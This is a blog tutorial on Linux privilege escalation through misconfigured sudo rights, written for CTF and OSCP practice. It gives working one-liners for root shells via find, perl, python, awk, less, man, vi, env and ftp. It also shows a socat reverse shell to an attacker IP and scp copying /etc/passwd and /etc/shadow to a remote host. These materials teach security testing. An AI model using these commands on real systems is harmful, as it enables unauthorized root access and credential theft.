---
title: 'Linux Privilege Escalation using Sudo Rights'
date: 2020-01-21T19:54:00+01:00
draft: false
---

  

In our previous articles, we have discussed Linux Privilege Escalation using [SUID Binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/) and [/etc/passwd](https://www.hackingarticles.in/privilege-escalation-in-linux-using-etc-passwd-file/) file and today we are posting another method of “Linux privilege Escalation using Sudoers file”. While solving CTF challenges, for privilege escalation we always check root permissions for any user to execute any file or command by executing **sudo -l command**. You can read our previous article where we had applied this trick for privilege escalation.  
**Let’s Start with Theoretical Concept!!**  
In Linux/Unix, a sudoers file inside /etc is the configuration file for sudo rights. We all know the power of sudo command, the word sudo represent **S**uper **U**ser **D**o root privilege task. Sudoers file is that file where the users and groups with root privileges are stored to run some or all commands as root or another user. Take a look at the following image.  
![](https://i1.wp.com/2.bp.blogspot.com/-ai15msp43M8/WwZTT0rFHcI/AAAAAAAAXAk/8gow32i4VOEH9AcjKl5WCQrjiAeXU_K3gCLcBGAs/s1600/1.png?w=687)  
When you run any command along with sudo, it needs root privileges for execution, Linux checks that particular username within the sudoers file. And it concluded, that the particular username is in the list of sudoers file or not, if not then you cannot run the command or program using the sudo command. As per sudo rights the root user can execute from **ALL terminals**, acting as **ALL users**: **ALL group**, and run **ALL command**.  

### **Sudoer File Syntax**

If you (root user) wish to grant sudo right to any particular user then type **visudo** command which will open the sudoers file for editing. Under “user privilege specification” you will observe default root permission “**root ALL=(ALL:ALL) ALL**” BUT in actual, there is **Tag option** also available which is **optional,** as explained below in the following image.  
Consider the given example where we want to assign sudo rights for user:raaz to access the terminal and run copy command with root privilege. Here NOPASSWD tag that means no password will be requested for the user.  
**NOTE:**  

1.  (ALL:ALL) can also represent as (ALL)
2.  If you found (root) in place of (ALL:ALL) then it denotes that user can run the command as root.
3.  If nothing is a mention for user/group then it means sudo defaults to the root user.

![](https://i2.wp.com/2.bp.blogspot.com/-7HdHllzAXZU/WwZTV0yMDYI/AAAAAAAAXBA/6gOuaUG5b70GfAgtusuMxqPpX5Ji1rRCgCLcBGAs/s1600/2.1.png?w=687)  
**Let’s Begin!!**  
Let’s get into deep through practical work. First, create a user which should be not the sudo group user. Here we have added user “raaz” who’s UID is 1002 and GID is 1002 and hence raaz is non-root user.  
** ![](https://i2.wp.com/4.bp.blogspot.com/-tNdRkLfQ2nY/WwZTWlBpKvI/AAAAAAAAXBM/5F70LWFsLzkRXxJnUgg71dMenx8t511oACLcBGAs/s1600/2.png?w=687)**  

### **Traditional Method to assign Root Privilege **

If the system administrator wants to give ALL permission to user raaz then he can follow the below steps to add user raaz under User Privilege Specification category.  

visudo raaz ALL=(ALL:ALL) ALL or raaz ALL=(ALL) ALL

1

2

3

4

visudo

raaz ALL\=(ALL:ALL)  ALL

or

raaz ALL\=(ALL)  ALL

![](https://i0.wp.com/4.bp.blogspot.com/-8gR4nPSYyN4/WwZTYl9f9gI/AAAAAAAAXBw/z07NheXnc9g2zwdl28IyMfC60QGcMoubwCLcBGAs/s1600/3.png?w=687)  

### **Spawn Root Access**

On other hands start your attacking machine and first compromise the target system and then move to privilege escalation phase. Suppose you successfully login into victim’s machine through ssh and want to know sudo rights for the current user then execute below command.  

sudo -l

1

sudo  \-l

In the traditional method, PASSWD option is enabled for user authentication while executing the above command and it can be disabled by using NOPASSWD tag. The highlighted text is indicating that the current user is authorized to execute all command. Therefore we have obtained root access by executing the command.  

sudo su id

1

2

sudo su

id

![](https://i0.wp.com/2.bp.blogspot.com/-PaDxpIQHpC0/WwZTYh9QDeI/AAAAAAAAXB0/RDKrrFIzhZIvjFzzK3mruBWajVmnO_XPgCLcBGAs/s1600/4.png?w=687)  

### **Default Method to assign Root Privilege **

If the system administrator wants to give root permission to user raaz to execute all command and program then he can follow below steps to add user raaz under User Privilege Specification category.  

visudo raaz ALL=ALL or raaz ALL=(root) ALL

1

2

3

4

visudo

raaz ALL\=ALL

or

raaz ALL\=(root)  ALL

Here also Default PASSWD option is enabled for authentication.  
![](https://i0.wp.com/1.bp.blogspot.com/-0nLnf6gx1Pg/WwZTZJFCoXI/AAAAAAAAXB4/2M6_S8Xe7n09E_QRSIsg3uoQSUbgKJLnACLcBGAs/s1600/5.png?w=687)  

### **Spawn Root Access**

Again compromise the target system and then move for privilege escalation stage as done above and execute the below command to view sudo user list.  

sudo -l

1

sudo  \-l

Here you can perceive the highlighted text which is representative that the user raaz can run all command as root user. Therefore we can achieve root access by performing further down steps.  

sudo su or sudo bash

1

2

3

sudo su

or

sudo bash

**Note:** Above both methods will ask user’s password for authentication at the time of execution of **sudo -l** command because by Default PASSWD option is enabled.  
![](https://i2.wp.com/2.bp.blogspot.com/-KXDRut3kQus/WwZTZNK3NNI/AAAAAAAAXB8/RRF95tp-9NAU_EAfMLLvwjuP6oNEdbbHQCLcBGAs/s1600/7.png?w=687)  

### **Allow Root Privilege to Binary commands**

Sometimes the user has the authorization to execute any file or command of a particular directory such as /bin/cp, /bin/cat or /usr/bin/ find, this type of permission lead to privilege escalation for root access and it can be implemented with help of following steps.  

raaz ALL=(root) NOPASSWD: /usr/bin/find

1

raaz ALL\=(root)  NOPASSWD:  /usr/bin/find

**NOTE:** Here NOPASSWD tag that means no password will be requested for the authentication while running sudo -l command.  
** ![](https://i2.wp.com/3.bp.blogspot.com/-Tk94o7a16NE/WwZTZV-l89I/AAAAAAAAXCA/XZbgrAJlBj0uFGo0fkqW_aCUFqc3WFtawCLcBGAs/s1600/9.png?w=687)**  

### **Spawn Root Access using Find Command**

Again compromised the Victim’s system and then move for privilege escalation phase and execute below command to view sudo user list.  

sudo -l

1

sudo  \-l

At this point, you can notice the highlighted text is indicating that the user raaz can run any command through find command. Therefore we got root access by executing below commands.  

sudo find /home -exec /bin/bash \\; id

1

2

sudo find  /home  \-exec  /bin/bash  \\;

id

**![](https://i0.wp.com/2.bp.blogspot.com/-B_Boz4ArL8o/WwZTT9bCHpI/AAAAAAAAXAg/9tx9bbHfPXsuG5bir2fBSGRukd5ucTDHgCLcBGAs/s1600/11.png?w=687) **  

### **Allow Root Privilege to Binary Programs**

Sometimes admin assigns delicate authorities to a particular user to run binary programs which allow a user to edit any system files such as /etc/passwd and so on. There are certain binary programs which can lead to privilege escalation if authorized to a user. In given below command we have assign sudo rights to the following program which can be run as root user.  

raaz ALL= (root) NOPASSWD: /usr/bin/perl, /usr/bin/python, /usr/bin/less, /usr/bin/awk, /usr/bin/man, /usr/bin/vi

1

raaz ALL\=  (root)  NOPASSWD:  /usr/bin/perl,  /usr/bin/python,  /usr/bin/less,  /usr/bin/awk,  /usr/bin/man,  /usr/bin/vi

![](https://i0.wp.com/4.bp.blogspot.com/-GKkj4eDCVBc/WwZTT_mo7XI/AAAAAAAAXAc/iLxoOjqCJl4LPJKwcYgPXp3tiWNUHzv-QCLcBGAs/s1600/12.png?w=687)  

### **Spawn shell using Perl**

At the time of privilege, escalation phase executes below command to view the sudo user list.  

sudo -l

1

sudo  \-l

Now you can observe the highlighted text is showing that the user raaz can run Perl language program or script as root user. Therefore we got root access by executing Perl one-liner.  

sudo perl -e 'exec "/bin/bash";' id

1

2

sudo perl  \-e  'exec "/bin/bash";'

id

**![](https://i1.wp.com/1.bp.blogspot.com/-I1TaJ-ZVUbw/WwZTUtk6LXI/AAAAAAAAXAs/5Zl9NdRrDwkIxg1fsJHpkRHySvDT6GZkwCLcBGAs/s1600/13.png?w=687)**  

### **Spawn shell using Python**

After compromising the target system and then move for privilege escalation phase as done above and execute the below command to view the sudo user list.  

sudo -l

1

sudo  \-l

At this point, you can perceive the highlighted text is indicating that the user raaz can run Python language program or script as root user. Thus we acquired root access by executing Python one-liner.  

sudo python -c 'import pty;pty.spawn("/bin/bash")' id

1

2

sudo python  \-c  'import pty;pty.spawn("/bin/bash")'

id

![](https://i0.wp.com/3.bp.blogspot.com/-ybEFrJq8PR0/WwZTUT_VSTI/AAAAAAAAXAo/hs0x2CTUL0kGd4VXdEreic4Ea0ovg_AwgCLcBGAs/s1600/14.png?w=687)  

### **Spawn shell using Less Command**

For the privilege, escalation phase executes below command to view the sudo user list.  

sudo -l

1

sudo  \-l

![](https://i0.wp.com/4.bp.blogspot.com/-pwLd4I0nS78/WwZTUlPjQwI/AAAAAAAAXAw/Gok_4ZpheUoN2lJ961XyyPixI3bfzaHGwCLcBGAs/s1600/16.png?w=687)  
Here you can observe the highlighted text which is indicating that the user raaz can run less command as root user. Hence we obtained root access by executing the following.  

sudo less /etc/hosts

1

sudo less  /etc/hosts

![](https://i0.wp.com/1.bp.blogspot.com/-WakRShQRD_s/WwZTVC_bh4I/AAAAAAAAXA0/8trMMtN0fWo-fghXJJjo1ZVnlYhX8dc7wCLcBGAs/s1600/17.png?w=687)  
It will open requested system file for editing, BUT for spawning root shell type **!bash** as shown below and hit enter.  
You will get root access as shown in the below image.  
![](https://i2.wp.com/3.bp.blogspot.com/-awIMJQqnZ4o/WwZTVX6T8VI/AAAAAAAAXA4/Ra1nm_ItAJ4dwOdNtFkRJgIaDOwAbRkRgCLcBGAs/s1600/18.png?w=687)  

### **Spawn shell using AWK**

After the compromise, the target system then moves for privilege escalation phase as done above and execute the below command to view the sudo user list.  

sudo -l

1

sudo  \-l

At this phase, you can notice the highlighted text is representing that the user raaz can run AWK language program or script as root user. Therefore we obtained root access by executing AWK one-liner.  

sudo awk 'BEGIN {system("/bin/bash")}' id

1

2

sudo awk  'BEGIN {system("/bin/bash")}'

id

![](https://i0.wp.com/3.bp.blogspot.com/-3z4d9NLyZDY/WwZTVdOxolI/AAAAAAAAXA8/MNXLKudiLMYK46u-v2_HZCtCE66OYNupgCLcBGAs/s1600/19.png?w=687)  

### **Spawn shell using Man Command (Manual page)**

For privilege escalation and execute below command to view sudo user list.  

sudo -l

1

sudo  \-l

Here you can observe the highlighted text is indicating that the user raaz can run man command as root user. Therefore we got root access by executing the following.  

sudo man man

1

sudo man man

![](https://i2.wp.com/3.bp.blogspot.com/-Ga7s49HvIwk/WwZTWXR7FqI/AAAAAAAAXBE/GP0HgHi5REwrjiAxvJn4kU1-g3-hHsKDACLcBGAs/s1600/20.png?w=687)  
It will be displaying Linux manual pages for editing, BUT for spawning root shell type **!bash** as presented below and hit enter, you get root access as done above using Less command.  
![](https://i1.wp.com/1.bp.blogspot.com/-OtJcnU-fFes/WwZTWSvUeQI/AAAAAAAAXBI/TEDWwTP4YLY8ggD-FqGTEB29NuCihVj3ACLcBGAs/s1600/21.png?w=687)  
You will get root access as shown in the below image.  
![](https://i1.wp.com/1.bp.blogspot.com/-nPNaM0oVeJQ/WwZjoTQRCsI/AAAAAAAAXCk/SMB8EqA2qQgevyIUvQhQ7PesVzOFyG1_gCLcBGAs/s1600/24.png?w=687)  

### **Spawn shell using Vi-editor (Visual editor)**

After compromising the target system and then move for privilege escalation phase as done above and execute the below command to view the sudo user list.  

sudo -l

1

sudo  \-l

Here you can observe the highlighted text which is indicating that user raaz can run vi command as root user. Consequently, we got root access by executing the following.  

sudo vi

1

sudo vi

![](https://i0.wp.com/4.bp.blogspot.com/-jPyDZ5nFYEw/WwZTWwrFqMI/AAAAAAAAXBQ/Ouvc7z5hqw0XQXbhPYuz16IdvUzLwvQSgCLcBGAs/s1600/22.png?w=687)  
Thus, It will open vi editors for editing, BUT for spawning root shell type **!bash** as shown below and hit enter, you get root access as done above using Less command.  
![](https://i2.wp.com/3.bp.blogspot.com/-U2diXcQMxs0/WwZTW47RU-I/AAAAAAAAXBU/hgSzbDISebsa5HZsiF1-t7ZaSBVQv_RNgCLcBGAs/s1600/23.png?w=687)  
You will get root access as shown in the below image.  

id whoami

1

2

id

whoami

**NOTE:** sudo permission for less, nano, man, vi and man is very dangerous as they allow the user to edit system file and lead to Privilege Escalation.   
** ![](https://i2.wp.com/2.bp.blogspot.com/-ZDKThMqVdHQ/WwZTXDs21yI/AAAAAAAAXBY/ute2d8OVU6I39Yo-d8FQ-g-vGo6JRi_XgCLcBGAs/s1600/24.png?w=687)**  

### **Allow Root Privilege to Shell Script**

There are maximum chances to get any kind of script for the system or program call, it can be any script either Bash, PHP, Python or C language script. Suppose you (system admin) want to give sudo permission to any script which will provide bash shell on execution.  
_For example, we have some scripts which will provide root terminal on execution, in given below image you can observe that we have written 3 programs for obtaining bash shell by using different programing language and saved all three files: **asroot.py, asroot.sh, asroot.c** (compiled file **shell**) inside bin/script._  
**NOTE:** While solving OSCP challenges you will find that some script is hidden by the author for exploit kernel or for root shell and set sudo permission to any particular user to execute that script.  
![](https://i1.wp.com/2.bp.blogspot.com/-j6xIQCMa72I/WwZTXaOYcVI/AAAAAAAAXBc/Jnpts2JpoHIebObctZKpJJiXhDkpCKkoQCLcBGAs/s1600/25.png?w=687)  
Now allow raaz to run all above script as root user by editing sudoers file with the help of the following command.  

raaz ALL= (root) NOPASSWD: /bin/script/asroot.sh, /bin/script/asroot.py, /bin/script/shell

1

raaz ALL\=  (root)  NOPASSWD:  /bin/script/asroot.sh,  /bin/script/asroot.py,  /bin/script/shell

**![](https://i0.wp.com/2.bp.blogspot.com/-mqbztNiaMww/WwZTXhfoGCI/AAAAAAAAXBg/xXqwJiwJA7oOPF1HDPURKOLSGMPFk7MYgCLcBGAs/s1600/26.png?w=687)**  

### **Spawn root shell by Executing Bash script**

For the privilege, escalation phase executes below command to view the sudo user list.  

sudo -l

1

sudo  \-l

The highlighted text is indicating that the user raaz can run asroot.sh as the root user. Therefore we got root access by running asroot.sh script.  

sudo /bin/script/asroot.sh id

1

2

sudo  /bin/script/asroot.sh

id

**![](https://i2.wp.com/1.bp.blogspot.com/-nloPAfhDgcQ/WwZTX8GnfxI/AAAAAAAAXBk/5IOM2UUB6rA-u1QCkhxfCFBw0587QtMZwCLcBGAs/s1600/27.png?w=687)**  

### **Spawn root shell by Executing Python script**

Execute below command for privilege escalation to view sudo user list.  

sudo -l

1

sudo  \-l

At this time the highlighted text is showing that user raaz can run asroot.py as the root user. Therefore we acquired root access by executing the following script.  

sudo /bin/script/asroot.py id

1

2

sudo  /bin/script/asroot.py

id

![](https://i1.wp.com/2.bp.blogspot.com/--MPkOtDjETQ/WwZTYJ0zZCI/AAAAAAAAXBo/avWmmoOzn5EqhsC4992AZX4lscY9jH6YACLcBGAs/s1600/28.png?w=687)  

### **Spawn root shell by Executing C Language script**

After compromising the target system and then move for privilege escalation and execute below command to view the sudo user list.  

sudo -l

1

sudo  \-l

Here you can perceive the highlighted text is indicating that the user raaz can run shell (asroot.c compiled file) as the root user. So we obtained root access by executing the following shell.  

sudo /bin/script/shell id

1

2

sudo  /bin/script/shell

id

![](https://i1.wp.com/3.bp.blogspot.com/-VPe-tKOmB1Q/WwZTYTF5yII/AAAAAAAAXBs/x4LLW7vB--sErAKEOv1tse1hCh7nEJhAgCLcBGAs/s1600/29.png?w=687)  

### **Allow Sudo Right to other Programs**

As we have seen above, some binary programs with sudo right are helpful in getting root access. But apart from that, there are some application which can also provide root access if owned sudo privilege such as FTP or socat.  In given below command we have assign sudo rights to the following program which can be run as root user.  

raaz ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat

1

raaz ALL\=(ALL)  NOPASSWD:  /usr/bin/env,  /usr/bin/ftp,  /usr/bin/scp,  /usr/bin/socat

![](https://i2.wp.com/2.bp.blogspot.com/-J8xJCvskWHQ/W3BOhzc1seI/AAAAAAAAZsA/Emu2n-Fn4VYgh7Dz2epWMeve1sscjpL8QCLcBGAs/s1600/0.png?w=687)  

### **Spawn Shell Using Env**

 At the time of privilege escalation phase, executes below command to view sudo user list.  

sudo -l

1

sudo  \-l

As we can observe user: raaz has sudo rights for env, FTP, SCP, and Socat, now let’s try to get root access through them one-by-one.  

sudo env /bin/bash whoami

1

2

sudo env  /bin/bash

whoami

![](https://i1.wp.com/3.bp.blogspot.com/-22D-TwyJWNQ/W3BOh6zBgfI/AAAAAAAAZsE/gw_YjVSig0kUa4xnzV_yGo2fqHJpGmkSgCLcBGAs/s1600/1.png?w=687)  

### **Spawn Shell Using FTP**

Now let’s try to get root access through FTP with the help of following commands:  

sudo ftp ! /bin/bash whoami or ! /bin/sh id whoami

1

2

3

4

5

6

7

sudo ftp

!  /bin/bash

whoami

or

!  /bin/sh

id

whoami

![](https://i0.wp.com/2.bp.blogspot.com/-5vW-UNCSNfc/W3BOhk_4VFI/AAAAAAAAZr8/uslfJKdfJTUr372x6TUJcmLeCwC3CvPQgCLcBGAs/s1600/2.png?w=687)  

### **Spawn Shell Using Socat**

Now let’s try to get root access through socat with the help of following commands. Execute below command on the attacker’s terminal in order to enable listener for reverse connection.  

socat file:\`tty\`,raw,echo=0 tcp-listen:1234

1

socat file:\`tty\`,raw,echo\=0  tcp\-listen:1234

Then run the following command on victim’s machine and you will get root access on your attacker machine.  

sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234

1

sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234

![](https://i1.wp.com/3.bp.blogspot.com/-XmeRwflSsa0/W3BOic6vYDI/AAAAAAAAZsI/RBCsUYCUSIsvOiZKHFgTf7RGNhWenFXUgCLcBGAs/s1600/3.png?w=687)  
![](https://i2.wp.com/1.bp.blogspot.com/-n0edo3JPYHo/W3BOiyL2eiI/AAAAAAAAZsM/cmDdirECHVQarLdRvIH-TuGPCgHVpPVdQCLcBGAs/s1600/4.png?w=687)  

### **Spawn shell through SCP**

As we know sudo right is available for SCP but it is not possible to get bash shell directory as shown above because it is a means of securely moving any files between a local host and a remote host. Therefore we can use it for transferring those system files which requires root permission to perform read/write operation such as /etc/passwd and /etc/shadow files.  
**Syntax:** scp SourceFile user@host:~/path of the directory  

sudo scp /etc/passwd aarti@192.168.1.105:~/ sudo scp /etc/shadow aarti@192.168.1.105:~/

1

2

sudo scp  /etc/passwd aarti@192.168.1.105:~/

sudo scp  /etc/shadow aarti@192.168.1.105:~/

![](https://i0.wp.com/2.bp.blogspot.com/-bgqCwS-nO2U/W3BOi0DwLII/AAAAAAAAZsQ/n-GROVJPMQkk9uXXDju8Z_-iObdOQ9xdgCLcBGAs/s1600/5.png?w=687)  
Now let’s confirm the transformation by inspecting remote directory and as you can observe we have successfully received passwd and shadow files in our remote pc.  
![](https://i2.wp.com/2.bp.blogspot.com/-hyZICA9iHdU/W3BOjF4188I/AAAAAAAAZsU/EZeXDQq6mBsqdWtwlMEqTY8SKSrLPEy1ACLcBGAs/s1600/6.png?w=687)